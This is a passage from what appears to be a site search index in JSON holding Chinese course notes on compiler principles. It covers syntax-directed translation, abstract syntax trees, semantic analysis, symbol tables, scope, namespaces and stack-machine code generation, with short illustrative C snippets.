ai\u662f\u8bed\u4e49\u52a8\u4f5c\uff0c\u6700\u5de6\u4fa7\u7684n\u662f\u5206\u6790\u72b6\u6001\n1: X -&gt; \u03b21   a1\n2:     |\u03b22   a2\n...\nn:     |\u03b2n   a3\n\n## \u4ee3\u7801\u5b9e\u73b0\nif(action[s,t]==\"ri\")\n  ai   ## \u5f52\u7ea6\u65f6\u6267\u884c\u8bed\u4e49\u52a8\u4f5c\n  pop(\u03b2i)\n  state s' = stack[top]\n  push(x)\n  push(goto[s'],x)\n</code></pre> <p>\u5728\u5206\u6790\u6808\u4e0a\u7ef4\u62a4\u4e09\u5143\u7ec4\uff1a <p>\u5176\u4e2d symbol \u662f\u7ec8\u7ed3\u7b26\u6216\u975e\u7ec8\u7ed3\u7b26\uff0cstate \u662f\u5f53\u524d\u7684\u5206\u6790\u72b6\u6001\uff0c\u8fd9\u4e24\u4e2a\u662f\u672c\u8eab\u5c31\u9700\u8981\u7ef4\u62a4\u7684\u5185\u5bb9\uff0cvalue \u662f\u65b0\u52a0\u5165\u7684\u503c\uff0c\u8868\u793a symbol \u6240\u62e5\u6709\u7684\u503c\u3002</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#_37","title":"\u62bd\u8c61\u8bed\u6cd5\u6811","text":"<p>\u5728\u4e0a\u8ff0\u7684\u8bed\u6cd5\u5206\u6790\u8fc7\u7a0b\u4e2d\uff0c\u5df2\u7ecf\u751f\u6210\u4e86\u8bed\u6cd5\u6811\uff0c\u4f8b\u5982<code>15*(3+4)</code>\u7684\u62bd\u8c61\u8bed\u6cd5\u6811\u5982\u56fe\u5de6\u6240\u793a\uff1a</p> <p></p> <p>\u6839\u636e\u51af\u8bfa\u4f9d\u66fc\u8ba1\u7b97\u673a\u67b6\u6784\uff0c\u7f16\u8bd1\u5668\u5de5\u4f5c\u7684\u8fc7\u7a0b\u4e2d\uff0c\u4ece\u78c1\u76d8\u4e2d\u8bfb\u53d6\u6e90\u4ee3\u7801\uff0c\u7136\u540e\u751f\u6210\u5bf9\u5e94\u7684\u8bed\u6cd5\u6811\u5b58\u5165 \u5185\u5b58 \u4e2d\u3002</p> <p>\u8bed\u6cd5\u5206\u6790\u6811\u7f16\u7801\u4e86\u53e5\u5b50\u7684\u5177\u4f53\u63a8\u5bfc\u8fc7\u7a0b\uff0c\u5176\u4e2d\u5305\u542b\u4e86\u8bb8\u591a\u4e0d\u5fc5\u8981\u7684\u4fe1\u606f\uff0c\u8fd9\u4e9b\u4fe1\u606f\u9700\u8981\u5360\u7528\u989d\u5916\u7684\u5b9d\u8d35\u5185\u5b58\u7a7a\u95f4\u3002</p> <p>\u7531\u6b64\u5f15\u5165\u4e24\u79cd\u5177\u4f53\u8bed\u6cd5\u548c\u62bd\u8c61\u8bed\u6cd5\u7684\u6982\u5ff5\uff1a</p> <ul> <li>\u5177\u4f53\u8bed\u6cd5\uff1a\u8bed\u6cd5\u5206\u6790\u5668\u4f7f\u7528\u7684\u8bed\u6cd5\uff0c\u5fc5\u987b\u9002\u5408\u4e8e\u8bed\u6cd5\u5206\u6790\uff0c\u5982\u5404\u79cd\u5206\u9694\u7b26\u3001\u6d88\u9664\u5de6\u9012\u5f52\u3001\u63d0\u53d6\u5de6\u516c\u56e0\u5b50\u7b49</li> <li>\u62bd\u8c61\u8bed\u6cd5\uff1a\u8868\u8fbe\u8bed\u6cd5\u7ed3\u6784\u7684\u5185\u90e8\u8868\u793a\uff0c\u73b0\u4ee3\u7f16\u8bd1\u5668\u4e00\u822c\u90fd\u91c7\u7528\u62bd\u8c61\u8bed\u6cd5 \u4f5c\u4e3a\u524d\u7aef\uff08\u8bcd\u6cd5\u3001\u8bed\u6cd5\u5206\u6790\uff09\u548c\u540e\u7aef\uff08\u4ee3\u7801\u751f\u6210\uff09\u7684\u4e2d\u95f4\u63a5\u53e3\u3002</li> </ul> <p>\u5728\u7f16\u8bd1\u5668\u4e2d\uff0c\u4e3a\u4e86\u5b9a\u4e49\u62bd\u8c61\u8bed\u6cd5\u6811\uff0c\u9700\u8981\u4f7f\u7528\u7f16\u8bd1\u5668\u7684\u5b9e\u73b0\u8bed\u8a00\u6765\u5b9a\u4e49\u4e00\u7ec4\u6570\u636e\u7ed3\u6784\u3002\u4ee5 C \u8bed\u8a00\u4e3a\u4f8b\uff1a</p> <pre><code>// \u62bd\u8c61\u8bed\u6cd5\nE -&gt; n\n    | E + E\n    | E * E\n// \u6570\u636e\u7ed3\u6784\nenum kind {E_INT, E_ADD, E_TIMES};\nstruct Exp {\n  enum kind kind;\n};\nstruct Exp_Int {\n  enum kind kind;\n  int n;\n};\nstruct Exp_Add {\n  enum kind kind;\n  struct Exp *left;\n  struct Exp *right;\n};\nstruct Exp_Times{\n  enum kind kind;\n  struct Exp *left;\n  struct Exp *right;\n}\n// \u6784\u9020\u51fd\u6570\nstruct Exp_int *Exp_Int_new(int n)\n{\n  struct Exp_Int *p = malloc(sizeof(*p));\n  p-&gt;kind = E_INT;\n  p-&gt;n = n;\n  return p;\n}\nstruct Exp_Add *Exp_Add_new(struct Exp *left, struct Exp *right)\n{\n  struct Exp_Add *p = malloc(sizeof(*p));\n  p-&gt;kind = E_Add;\n  p-left = left;\n  p-right = right;\n  return p;\n}\n// \u7528\u6570\u636e\u7ed3\u6784\u6765\u7f16\u7801\u7a0b\u5e8f 2+3*4\ne1 = Exp_Int_new(2)\ne2 = Exp_Int_new(3)\ne3 = Exp_Int_new(4)\ne4 = Exp_Times_new(e2,e3)\ne5 = Exp_Add_new(e1,e4)\n</code></pre> <p>\u65e9\u671f\u7684\u7f16\u8bd1\u5668\u6709\u7684\u4e0d\u91c7\u7528\u62bd\u8c61\u8bed\u6cd5\u6811\u6570\u636e\u7ed3\u6784\uff0c\u76f4\u63a5\u5728\u8bed\u6cd5\u5236\u5bfc\u7ffb\u8bd1\u4e2d\u751f\u6210\u4ee3\u7801\u3002\u4f46\u4e3a\u4e86\u66f4\u597d\u7684\u7cfb\u7edf\u8f93\u51fa\u548c\u7b80\u5316\u7f16\u8bd1\u5668\u7684\u8bbe\u8ba1\uff0c\u73b0\u4ee3\u7684\u7f16\u8bd1\u5668\u4e00\u822c\u90fd\u91c7\u7528\u62bd\u8c61\u8bed\u6cd5\u6811\u4f5c\u4e3a\u8bed\u6cd5\u5206\u6790\u5668\u7684\u8f93\u51fa\u3002</p> <p>\u62bd\u8c61\u8bed\u6cd5\u6811\u662f\u7f16\u8bd1\u5668\u524d\u7aef\u548c\u540e\u7aef\u7684\u63a5\u53e3\uff0c\u7a0b\u5e8f\u4e00\u65e6\u88ab\u8f6c\u5316\u6210\u62bd\u8c61\u8bed\u6cd5\u6811\uff0c\u5219\u6e90\u4ee3\u7801\u5c31\u4f1a\u88ab\u7f16\u8bd1\u5668\u4e22\u5f03\uff0c\u540e\u7eed\u7684\u9636\u6bb5\u53ea\u5904\u7406\u62bd\u8c61\u8bed\u6cd5\u6811\u3002</p> <p>\u56e0\u6b64\u62bd\u8c61\u8bed\u6cd5\u6811\u5fc5\u987b\u7f16\u7801\u8db3\u591f\u591a\u7684\u6e90\u4ee3\u7801\u4fe1\u606f\uff0c\u4f8b\u5982\uff1a\u5fc5\u987b\u7f16\u7801\u6bcf\u4e2a\u8bed\u6cd5\u7ed3\u6784\u5728\u6e90\u4ee3\u7801\u4e2d\u7684\u4f4d\u7f6e\uff08\u6587\u4ef6\uff0c\u884c\u53f7\uff0c\u5217\u53f7\u7b49\uff09\uff0c\u8fd9\u6837\u540e\u7eed\u7684\u9636\u6bb5\u624d\u80fd\u7cbe\u51c6\u62a5\u9519\u3002</p> <p>\u4f4d\u7f6e\u4fe1\u606f\u7684\u4ee3\u7801\u5b9e\u73b0\u5982\u4e0b\uff1a</p> <pre><code>struct position_t{\n  char *file;\n  int line;\n  int column;\n};\nstruct Exp_Add{\n  enum kind kind;\n  Exp *left;\n  Exp *right;\n  struct position_t form;  // \u65b0\u589e\u4f4d\u7f6e\u8bb0\u5f55\n  struct position_t to;\n}\n</code></pre>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#_38","title":"\u8bed\u4e49\u5206\u6790","text":"<p>\u8bed\u4e49\u5206\u6790\u662f\u7f16\u8bd1\u5668\u524d\u7aef\u6700\u540e\u4e00\u6b65\u5de5\u4f5c\uff0c\u5728\u73b0\u4ee3\u7f16\u8bd1\u5668\u4e2d\u5176\u8f93\u5165\u4e3a\u62bd\u8c61\u8bed\u6cd5\u6811\uff0c\u8f93\u51fa\u662f\u4e2d\u95f4\u8868\u793a\u3002</p> <p></p> <p>\u8bed\u4e49\u5206\u6790\u53c8\u79f0\u4e3a\u7c7b\u578b\u68c0\u67e5\u3001\u4e0a\u4e0b\u6587 \u76f8\u5173 \u5206\u6790\u3002</p> <p>\u8bed\u4e49\u5206\u6790\u4e3b\u8981\u8d1f\u8d23\u68c0\u67e5\u7a0b\u5e8f\uff08\u62bd\u8c61\u8bed\u6cd5\u6811\uff09\u7684\u4e0a\u4e0b\u6587\u76f8\u5173\u7684\u5c5e\u6027\uff0c\u8fd9\u662f\u5177\u4f53\u8bed\u8a00\u76f8\u5173\u7684\uff0c\u5178\u578b\u7684\u60c5\u51b5\u5305\u62ec\uff1a</p> <ul> <li>\u53d8\u91cf\u5728\u4f7f\u7528\u524d\u5148\u8fdb\u884c\u58f0\u660e</li> <li>\u6bcf\u4e2a\u8868\u8fbe\u5f0f\u90fd\u6709\u5408\u9002\u7684\u7c7b\u578b</li> <li>\u51fd\u6570\u8c03\u7528\u548c\u51fd\u6570\u7684\u5b9a\u4e49\u4e00\u81f4</li> <li>...</li> </ul> <pre><code>int main()\n{\n  f(5);                 // \u8c03\u7528\u672a\u5b9a\u4e49\u7684\u51fd\u6570\n  x+=4;                 // \u53d8\u91cfx\u5728\u4f7f\u7528\u524d\u672a\u58f0\u660e\n  break;                // break\u7528\u4e8e\u8df3\u51fa\u5faa\u73af\uff0c\u6b64\u65f6\u4e0a\u6587\u65e0\u5faa\u73af\n  return;               // main\u51fd\u6570\u5b9a\u4e49\u4e2d\u8fd4\u56deint\uff0c\u6b64\u5904\u672a\u8fd4\u56de\u4efb\u4f55\u503c\n}\n</code></pre> <p>\u4e0a\u8ff0\u7684\u4ee3\u7801\u90fd\u7b26\u5408\u8bed\u6cd5\u5206\u6790\uff0c\u90fd\u7b26\u5408\u4e0a\u4e0b\u6587\u65e0\u5173\u6587\u6cd5\u7684\u89c4\u8303\uff0c\u4f46\u662f\u5bf9\u4e0a\u4e0b\u6587\u76f8\u5173\u7684\u8bed\u4e49\u5206\u6790\u6765\u8bf4\uff0c\u662f\u5b8c\u5168\u9519\u8bef\u7684\u3002</p> <p>\u5927\u90e8\u5206\u7684\u7a0b\u5e8f\u8bbe\u8ba1\u8bed\u8a00\u90fd\u91c7\u7528\u81ea\u7136\u8bed\u8a00\u6765\u8868\u8fbe\u7a0b\u5e8f\u8bed\u8a00\u7684\u8bed\u4e49\uff0c\u4f8b\u5982\uff0c\u5bf9\u4e8e<code>+</code>\u8fd0\u7b97\uff0c\u8981\u6c42\u5de6\u53f3\u64cd\u4f5c\u6570\u90fd\u5fc5\u987b\u6574\u578b\u6570\u3002\u56e0\u6b64\u7f16\u8bd1\u5668\u7684\u5b9e\u73b0\u8005\u5fc5\u987b\u5bf9\u8bed\u8a00\u4e2d\u7684\u8bed\u4e49\u89c4\u5b9a\u6709\u5168\u9762\u7684\u7406\u89e3\u3002</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#_39","title":"\u7b26\u53f7\u8868","text":"<p>\u4e3a\u4e86\u5b9e\u73b0\u8bed\u4e49\u5206\u6790\u7684\u4ee3\u7801\uff0c\u5fc5\u987b\u501f\u52a9\u7b26\u53f7\u8868\u3002</p> <p>\u7b26\u53f7\u8868\u7528\u6765\u5b58\u50a8\u7a0b\u5e8f\u4e2d\u7684 \u53d8\u91cf\u76f8\u5173\u4fe1\u606f\uff1a</p> <ul> <li>\u7c7b\u578b</li> <li>\u4f5c\u7528\u57df</li> <li>\u8bbf\u95ee\u63a7\u5236\u4fe1\u606f</li> <li>...</li> </ul> <p>\u7b26\u53f7\u8868\u5fc5\u987b\u5728\u7a7a\u95f4\u548c\u65f6\u95f4\u4e4b\u95f4\u8fdb\u884c\u6743\u8861\uff0c\u4ee5\u4fdd\u8bc1\u8bed\u4e49\u5206\u6790\u7684\u901f\u5ea6\u548c\u7a0b\u5e8f\u7684\u89c4\u6a21\u3002</p> <p>\u7b26\u53f7\u8868\u7684\u63a5\u53e3\u5982\u4e0b\uff0c\u4ee5 C \u8bed\u8a00\u4e3a\u4f8b\uff1a</p> <pre><code>typedef ... Table_t\nTable_t Table_new();                           // \u521b\u5efa\u7b26\u53f7\u8868\nvoid Table_enter(Table_t, Key_t, Value_t);     // \u6570\u636e\u5199\u5165\u7b26\u53f7\u8868\nValue_t Table_lookup(Table_t, Key_t);          // \u641c\u7d22\u7b26\u53f7\u8868\u7684\u6570\u636e\n</code></pre> <p>\u5176\u4e2d<code>Value_t</code>\u662f\u5373\u5c06\u8981\u5199\u5165\u7b26\u53f7\u8868\u7684\u6570\u636e\uff0c\u5176\u5f62\u5f0f\u5982\uff1a</p> <pre><code>typedef struct Value_t{\n  Type_t type;\n  Scope_t scope;\n  ...// \u5176\u4ed6\u5fc5\u8981\u5b57\u6bb5\n}value_t;\n</code></pre> <p>\u4e3a\u4e86\u9ad8\u6548\uff0c\u53ef\u4ee5\u4f7f\u7528\u54c8\u5e0c\u8868\u7b49\u6570\u636e\u7ed3\u6784\u6765\u5b9e\u73b0\u7b26\u53f7\u8868\uff0cO(1)\uff1b\u4e3a\u4e86\u8282\u7ea6\u7a7a\u95f4\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528\u7ea2\u9ed1\u6811\u7b49\u5e73\u8861\u6811\uff0cO(lg N)\u3002</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#_40","title":"\u4f5c\u7528\u57df","text":"<pre><code>int x;\nint f()\n{\n  if(...){\n    int x;\n    x = 1;\n  }\n  else{\n    int x;\n    x = 2;\n  }\n  x = 3\n}\n</code></pre> <p>\u5728\u4e0a\u8ff0\u4ee3\u7801\u4e2d<code>x</code>\u7684\u4f5c\u7528\u57df\u53d1\u751f\u4e86\u591a\u6b21\u6539\u53d8\uff0c\u56e0\u6b64\u5728\u7b26\u53f7\u8868\u4e2d\u7684\u8bb0\u5f55\u4e5f\u5e94\u8be5\u505a\u5904\u7406\uff0c\u4e00\u822c\u6709\u4e0b\u8ff0\u65b9\u6cd5\uff1a</p> <ul> <li>\u5355\u4e2a\u7b26\u53f7\u8868\u7684\u65b9\u6cd5\uff1a\u8fdb\u5165\u4f5c\u7528\u57df\u65f6\uff0c\u63d2\u5165\u5143\u7d20\uff1b\u9000\u51fa\u4f5c\u7528\u57df\u65f6\uff0c\u5220\u9664\u5143\u7d20\u3002</li> <li>\u91c7\u7528\u7b26\u53f7\u8868\u6784\u6210\u7684\u6808\uff1a\u8fdb\u5165\u4f5c\u7528\u57df\u65f6\uff0c\u538b\u5165\u65b0\u7684\u7b26\u53f7\u8868\uff0c\u9000\u51fa\u4f5c\u7528\u57df\u65f6\uff0c\u5220\u9664\u6808\u9876\u7b26\u53f7\u8868\u3002</li> </ul> <p>\u4f7f\u7528<code>\u5355\u4e2a\u7b26\u53f7\u8868\u7684\u65b9\u6cd5</code>\u65f6\uff0c\u7531\u4e8e\u8868\u4e2d\u53ef\u80fd\u540c\u65f6\u5b58\u5728\u4e24\u4e2a\u76f8\u540c\u5143\u7d20\uff0c\u5982\u4e0a\u8ff0\u4ee3\u7801\u7684<code>x</code>\uff0c\u56e0\u6b64\u9700\u8981\u5bf9\u4e0d\u5728\u5f53\u524d\u4f5c\u7528\u57df\u7684<code>x</code>\u505a\u5c4f\u853d\u64cd\u4f5c\u3002</p> <p>\u5f53<code>\u91c7\u7528\u7b26\u53f7\u8868\u6784\u6210\u7684\u6808</code>\u65f6\uff0c\u4e3a\u6bcf\u4e2a\u4f5c\u7528\u57df\u65b0\u589e\u4e00\u4e2a\u7b26\u53f7\u8868\uff0c\u4f18\u5148\u5728\u5f53\u524d\u7684\u7b26\u53f7\u8868\u4e2d\u67e5\u8be2\uff0c\u82e5\u67e5\u8be2\u4e0d\u5230\uff0c\u518d\u53bb\u5916\u90e8\u7684\u7b26\u53f7\u8868\u67e5\u8be2\u3002</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#_41","title":"\u547d\u540d\u7a7a\u95f4","text":"<p>\u547d\u540d\u7a7a\u95f4\uff0c\u53c8\u79f0\u4e3a\u540d\u5b57\u7a7a\u95f4\uff0cName Space\u3002</p> <p>\u6ce8\u610f\u533a\u5206\u4f5c\u7528\u57df\u548c\u547d\u540d\u7a7a\u95f4\u7684\u533a\u522b\uff1a</p> <ul> <li>\u4f5c\u7528\u57df\uff1a\u4f5c\u7528\u57df\u662f\u9488\u5bf9\u547d\u540d\u7a7a\u95f4\u800c\u8a00\uff0c\u6307\u547d\u540d\u7a7a\u95f4\u5728\u7a0b\u5e8f\u91cc\u7684\u53ef\u5e94\u7528\u8303\u56f4\u3002\u5728\u67d0\u4e9b\u5730\u65b9\uff0c\u8fd9\u4e2a\u547d\u540d\u7a7a\u95f4\u4e2d\u7684\u540d\u5b57\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u3002</li> <li>\u547d\u540d\u7a7a\u95f4\uff1a\u4ece\u540d\u5b57\u5230\u5bf9\u8c61\u7684\u4e00\u4e2a\u6620\u5c04\u5173\u7cfb\u3002\u4e0d\u540c\u547d\u540d\u7a7a\u95f4\u662f\u76f8\u4e92\u72ec\u7acb\u7684\uff0c\u6ca1\u6709\u4efb\u4f55\u5173\u7cfb\u7684\uff0c\u6240\u4ee5\u540c\u4e00\u4e2a\u547d\u540d\u7a7a\u95f4\u4e2d\u4e0d\u80fd\u6709\u91cd\u540d\uff0c\u4f46\u4e0d\u540c\u7684\u547d\u540d\u7a7a\u95f4\u662f\u53ef\u4ee5\u91cd\u540d\u800c\u6ca1\u6709\u4efb\u4f55\u5f71\u54cd\u3002</li> </ul> <pre><code>struct list\n{\n  int x;\n  struct list *list;\n}*list;\nvoid walk(struct list *list)\n{\n  list:\n  printf(\"%d\\n\", list-&gt;x);\n  if(list = list-&gt;list)\n    goto list;\n}\n</code></pre> <p>\u5728\u4e0a\u8ff0\u4ee3\u7801\u4e2d\uff0c\u51fa\u73b0\u4e86\u5f88\u591a\u7684<code>list</code>\uff0c\u8fd9\u4e9b<code>list</code>\u53ef\u4ee5\u5728\u540c\u4e00\u4e2a\u4f5c\u7528\u57df\u4e2d\u91cd\u590d\u51fa\u73b0\uff0c\u539f\u56e0\u662f\u5b83\u4eec\u5206\u5e03\u5728\u56db\u4e2a\u4e92\u4e0d\u5e72\u6270\u7684\u547d\u540d\u7a7a\u95f4\u4e2d\uff1a</p> <ul> <li>\u7ed3\u6784\u4f53\u540d\uff1a<code>struct list</code></li> <li>\u53d8\u91cf\u540d</li> <li>\u7ed3\u6784\u4f53\u5185\u7684\u57df\uff1a<code>list-&gt;list</code></li> <li>\u6807\u53f7\uff1a<code>goto list</code></li> </ul> <p>\u53ef\u4ee5\u91c7\u7528<code>\u7b26\u53f7\u8868</code>\u6765\u5904\u7406\u547d\u540d\u7a7a\u95f4\u7684\u95ee\u9898\uff0c\u4e3a\u6bcf\u4e00\u4e2a\u547d\u540d\u7a7a\u95f4\u5355\u72ec\u4f7f\u7528\u4e00\u4e2a<code>\u7b26\u53f7\u8868</code>\uff0c\u8fd9\u6837\u4e0d\u540c\u7684\u547d\u540d\u7a7a\u95f4\u4e4b\u95f4\u5c31\u4e0d\u4f1a\u4e92\u76f8\u5e72\u6270\u3002</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#_42","title":"\u4ee3\u7801\u5b9e\u73b0\u793a\u4f8b","text":"<p>\u5728\u4ecb\u7ecd\u4e86\u7b26\u53f7\u8868\u7b49\u80cc\u666f\u77e5\u8bc6\u4e4b\u540e\uff0c\u53ef\u4ee5\u5f00\u59cb\u7b80\u5355\u7684\u5b9e\u73b0\u8bed\u4e49\u5206\u6790\uff0c\u4ee5 check_exp \u4e3a\u4f8b\uff1a</p> <pre><code>// \u62bd\u8c61\u8bed\u6cd5\nE -&gt; n\n    | true\n    | false\n    | E + E\n    | E * E\n// \u5b9e\u73b0\u4ee3\u7801\nenum type {INT, BOOL};\nenum type check_exp(Exp_t e)\n{\n  switch(e-&gt;kind):\n  case EXP_INT: return INT;\n  case EXP_TRUE: return BOOL;\n  case EXP_FALSE: return BOOL;\n  case EXP_ADD:\n                t1 = check_exp(e-&gt;left);\n                t2 = check_exp(e-&gt;right);\n                if(t1!=INT || t2!=INT)\n          {\n            error(\"trype mismatch\");\n          }\n                else return INT;\n  case EXP_... // \u7c7b\u4f3c\n}\n</code></pre>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#_43","title":"\u5176\u4ed6\u95ee\u9898","text":"<p>\u8bed\u4e49\u5206\u6790\u4e2d\u8fd8\u9700\u8981\u8003\u8651\u7684\u4e00\u4e9b\u5176\u4ed6\u95ee\u9898\uff1a</p> <ul> <li>\u7c7b\u578b\u76f8\u5bb9\u6027\uff1a\u7531\u4e8e\u5f15\u7528\u7c7b\u578b\u7684\u5b58\u5728\uff0c\u76f8\u5bb9\u6027\u7684\u8003\u8651\u53d8\u5f97\u5c24\u4e3a\u91cd\u8981\uff0c\u5f80\u5f80\u9700\u8981\u9012\u5f52\u6bd4\u8f83\u3002\uff08\u8fd8\u5305\u62ec\u5bf9\u8c61\u7ee7\u627f\u7b49\uff09</li> <li>\u9519\u8bef\u8bca\u65ad\uff1a\u8981\u5c3d\u53ef\u80fd\u591a\u3001\u51c6\u786e\u7684\u9519\u8bef\u4fe1\u606f\u53ca\u9519\u8bef\u4f4d\u7f6e\u3002</li> <li>\u4ee3\u7801\u7ffb\u8bd1\uff1a\u73b0\u4ee3\u7684\u7f16\u8bd1\u5668\u4e2d\u7684\u8bed\u4e49\u5206\u6790\u6a21\u5757\uff0c\u9664\u4e86\u505a\u8bed\u4e49\u5206\u6790\u5916\uff0c\u8fd8\u8981\u8d1f\u8d23\u751f\u6210<code>\u4e2d\u95f4\u4ee3\u7801</code>\u6216\u76ee\u6807\u4ee3\u7801\u3002</li> </ul> <p>\u7efc\u4e0a\u6240\u8ff0\uff0c\u8bed\u4e49\u5206\u6790\u6a21\u5757\u5f80\u5f80\u662f\u7f16\u8bd1\u5668\u4e2d\u6700\u5e9e\u5927\u4e5f\u6700\u590d\u6742\u7684\u6a21\u5757\u3002</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#_44","title":"\u4ee3\u7801\u751f\u6210","text":"<p>\u5728\u5f97\u5230\u62bd\u8c61\u8bed\u6cd5\u6811\u4e4b\u540e\uff0c\u6b63\u5f0f\u8fdb\u5165\u7f16\u8bd1\u5668\u7684\u4e2d\u95f4\u7aef\u3002</p> <p></p> <p>\u5176\u4e2d\u7ecf\u8fc7\u591a\u6b21<code>\u7ffb\u8bd1-&gt;\u4e2d\u95f4\u8868\u793a</code>\u4e4b\u540e\uff0c\u6700\u540e\u751f\u6210\u76ee\u6807\u673a\u5668\u4e0a\u7684\u6c47\u7f16\u8bed\u8a00\uff0c\u6211\u4eec\u5c06\u5176\u79f0\u4e3a\u4ee3\u7801\u751f\u6210\u3002</p> <p>\u76ee\u6807\u673a\u5668\u53ef\u4ee5\u662f\u771f\u5b9e\u7684\u7269\u7406\u673a\u5668\uff0c\u4e5f\u53ef\u4ee5\u662f\u865a\u62df\u673a\u3002</p> <p>\u4ee3\u7801\u751f\u6210\u6709\u4e24\u4e2a\u91cd\u8981\u7684\u4efb\u52a1\uff1a</p> <ul> <li> <p>\u7ed9\u6e90\u7a0b\u5e8f\u7684\u6570\u636e\u5206\u914d\u8ba1\u7b97\u8d44\u6e90</p> </li> <li> <p>\u6e90\u7a0b\u5e8f\u7684\u6570\u636e\uff1a\u5168\u5c40\u53d8\u91cf\u3001\u5c40\u90e8\u53d8\u91cf\u3001\u52a8\u6001\u5206\u914d\u7684\u7a7a\u95f4\u7b49</p> </li> <li>\u673a\u5668\u8ba1\u7b97\u8d44\u6e90\uff1a\u5bc4\u5b58\u5668\u3001\u6570\u636e\u533a\u3001\u4ee3\u7801\u533a\u3001\u6808\u533a\u3001\u5806\u533a</li> </ul> <p>\u9700\u8981\u6839\u636e\u7a0b\u5e8f\u7684\u7279\u70b9\u548c\u7f16\u8bd1\u5668\u7684\u8bbe\u8ba1\u76ee\u6807\uff0c\u5408\u7406\u7684\u4e3a\u6570\u636e\u5206\u914d\u8ba1\u7b97\u8d44\u6e90\uff0c\u4f8b\u5982\u53d8\u91cf\u653e\u5728\u5185\u5b58\u91cc\u8fd8\u662f\u5bc4\u5b58\u5668\u91cc\u7b49\u95ee\u9898\u3002</p> <ul> <li> <p>\u7ed9\u6e90\u7a0b\u5e8f\u7684\u4ee3\u7801\u9009\u62e9\u6307\u4ee4</p> </li> <li> <p>\u6e90\u7a0b\u5e8f\u7684\u4ee3\u7801\uff1a\u8868\u8fbe\u5f0f\u8fd0\u7b97\u3001\u8bed\u53e5\u3001\u51fd\u6570\u7b49</p> </li> <li>\u673a\u5668\u6307\u4ee4\uff1a\u7b97\u672f\u8fd0\u7b97\u3001\u6bd4\u8f83\u3001\u8df3\u8f6c\u3001\u51fd\u6570\u8c03\u7528\u8fd4\u56de\u7b49</li> </ul> <p>\u4f7f\u7528\u673a\u5668\u6307\u4ee4\u5b9e\u73b0\u6e90\u7a0b\u5e8f\u7684\u4ee3\u7801\u9700\u8981\u5bf9\u673a\u5668\u6307\u4ee4\u96c6\u4f53\u7cfb\u7ed3\u6784\uff08ISA\uff09\u5341\u5206\u719f\u6089\uff0c\u624d\u80fd\u4fdd\u8bc1\u4e8c\u8005\u7684\u7b49\u4ef7\u6027\u53ca\u6267\u884c\u6548\u7387\u3002</p> <p>\u4e0b\u9762\u5c06\u5206\u522b\u57fa\u4e8e\u6808\u5f0f\u8ba1\u7b97\u673a\u548c\u5bc4\u5b58\u5668\u8ba1\u7b97\u673a\u8fdb\u884c\u8bb2\u89e3\u3002</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#_45","title":"\u6808\u5f0f\u8ba1\u7b97\u673a","text":"<p>\u6808\u5f0f\u8ba1\u7b97\u673a\u5728\u4e0a\u4e16\u7eaa 70 \u5e74\u4ee3\u66fe\u975e\u5e38\u6d41\u884c\uff0c\u7531\u4e8e\u6548\u7387\u7b49\u539f\u56e0\u5df2\u7ecf\u57fa\u672c\u9000\u51fa\u4e86\u5386\u53f2\u821e\u53f0\u3002\u4eca\u5929\u4ecd\u65e7\u8ba8\u8bba\u6808\u5f0f\u8ba1\u7b97\u673a\u7684\u539f\u56e0\u662f\uff1a</p> <ul> <li>\u7ed9\u6808\u5f0f\u8ba1\u7b97\u673a\u751f\u6210\u4ee3\u7801\u662f\u6700\u5bb9\u6613\u7684\uff0c\u65b9\u4fbf\u672c\u8bfe\u7a0b\u7684\u8ba8\u8bba\u3002</li> <li>\u5982\u4eca\u4ecd\u65e7\u6709\u8bb8\u591a\u6808\u5f0f\u865a\u62df\u673a\uff1aPascal P Code\u3001Java virtual machine\u3001Postscript \u7b49</li> </ul> <p></p> <p>\u6808\u5f0f\u8ba1\u7b97\u673a\u7684\u62bd\u8c61\u7ed3\u6784\u5982\u56fe\uff0c\u6211\u4eec\u81ea\u5df1\u5b9a\u4e49\uff1a</p> <ul> <li>\u5185\u5b58 Memory\uff1a\u5b58\u653e\u6240\u6709\u53d8\u91cf</li> <li>\u6808 Stack\uff1a\u8fdb\u884c\u8fd0\u7b97\u7684\u7a7a\u95f4</li> <li>\u6267\u884c\u5f15\u64ce ALU\uff1a\u6307\u4ee4\u7684\u6267\u884c</li> </ul> <p>\u673a\u5668\u6307\u4ee4</p> 